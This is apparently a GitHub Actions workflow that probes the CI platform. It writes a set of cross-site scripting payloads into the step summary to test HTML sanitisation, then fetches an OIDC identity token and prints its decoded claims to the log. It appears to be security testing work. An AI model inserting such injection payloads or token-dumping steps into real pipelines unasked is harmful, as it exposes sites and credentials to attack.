name: Push Probe
on:
  push:
    branches: [main]
permissions:
  contents: read
  id-token: write
jobs:
  run:
    runs-on: ubuntu-latest
    if: contains(github.event.head_commit.message, 'PROBE-RUN')
    steps:
      - name: Step summary HTML injection test
        run: |
          {
            echo "# HTML Injection Test"
            echo "<script>document.title='XSS-FIRED'</script>"
            echo "<img src=x onerror=alert(document.domain)>"
            echo "<style>body{background:red!important}</style>"
            echo "<svg onload=alert(2)><rect width=100 height=100/></svg>"
            echo "<details open ontoggle=alert(3)><summary>!</summary></details>"
            echo "<a href=javascript:alert(4)>click</a>"
          } >> "$GITHUB_STEP_SUMMARY"
          echo "=== STEP SUMMARY CONTENT ==="
          cat "$GITHUB_STEP_SUMMARY"

      - name: OIDC push claims
        run: |
          T=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com" | jq -r '.value')
          echo "$T" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -c "
import sys,json
d=json.load(sys.stdin)
print('=== OIDC CLAIMS (push/main) ===')
for k,v in sorted(d.items()):
  print(k+': '+str(v))
"
